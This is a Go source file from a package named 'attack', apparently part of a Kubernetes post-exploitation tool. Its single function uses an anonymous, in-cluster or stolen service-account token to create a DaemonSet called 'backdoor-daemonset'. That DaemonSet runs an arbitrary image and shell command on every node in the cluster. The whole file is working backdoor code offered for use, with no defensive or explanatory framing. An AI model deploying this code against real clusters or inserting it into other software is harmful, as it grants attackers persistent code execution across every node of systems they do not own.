package attack

import (
	"context"
	"errors"

	log "github.com/sirupsen/logrus"
	appsv1 "k8s.io/api/apps/v1"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

func K8sBackDoorDaemonset(token, namespace, image, cmd string) {
	var config = new(rest.Config)
	var err = errors.New("")
	switch token {
	case "anonymous":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
		config = rest.AnonymousClientConfig(config)
	case "default":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
	default:
		config, err = SelfSAConfig(token)
		if err != nil {
			log.Fatal(err)
		}
	}
	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		log.Fatal(err)
	}
	var name = "backdoor-daemonset"
	daemonset, err := clientset.AppsV1().DaemonSets(namespace).Create(context.TODO(), &appsv1.DaemonSet{
		ObjectMeta: metav1.ObjectMeta{
			Name: name,
		},
		Spec: appsv1.DaemonSetSpec{
			Selector: &metav1.LabelSelector{
				MatchLabels: map[string]string{"app": name},
			},
			Template: v1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{"app": name},
				},
				Spec: v1.PodSpec{
					Containers: []v1.Container{
						{
							Name:            name,
							Image:           image,
							Command:         []string{"/bin/sh"},
							Args:            []string{"-c", cmd},
							ImagePullPolicy: v1.PullIfNotPresent,
						},
					},
				},
			},
		},
	}, metav1.CreateOptions{})
	if err != nil {
		log.Fatal(err)
	}
	log.WithFields(log.Fields{"SUCCESS": true}).Infof("Successfully create DaemonSet %s !", daemonset.Name)
}
